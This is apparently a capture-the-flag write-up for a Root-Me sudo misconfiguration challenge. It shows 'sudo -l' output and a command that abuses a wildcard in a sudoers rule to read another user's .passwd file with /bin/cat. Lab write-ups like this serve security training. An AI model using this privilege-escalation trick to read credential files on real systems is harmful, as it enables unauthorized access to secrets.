# Weak Configuration

## Reads
[sudo you are doing it wrong](https://repository.root-me.org/Administration/Unix/EN%20-%20sudo%20you%20are%20doing%20it%20wrong.pdf?_gl=1*1faer7q*_ga*MjgyMTQwNTMzLjE2NTI5MTc4MjU.*_ga_SRYSKX09J7*MTY1MjkyMjcyOC40LjAuMTY1MjkyMjczNy4w)

## Statement
Wishing to simplify the task by not modifying rights, the administrator has not thought about the side effects ...

## Solution
Looking at the results from `sudo -l`
```
Matching Defaults entries for app-script-ch1 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms, !mail_no_user

User app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*
```

We can run /bin/cat as app-script-ch1-cracked on any file in /challenge/app-script/ch1/notes/\*. At first I thought about creating my own "cat" application and overwriting PATH. However, everything here is given an absolute path. 

Luckily, there is a wildcard at the end of the file. So I cat cat all files in /challenge/app-script/ch1/notes/* and all other system files. Kind of like
```bash
sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/* /challenge/app-script/ch1/ch1cracked/.passwd
```
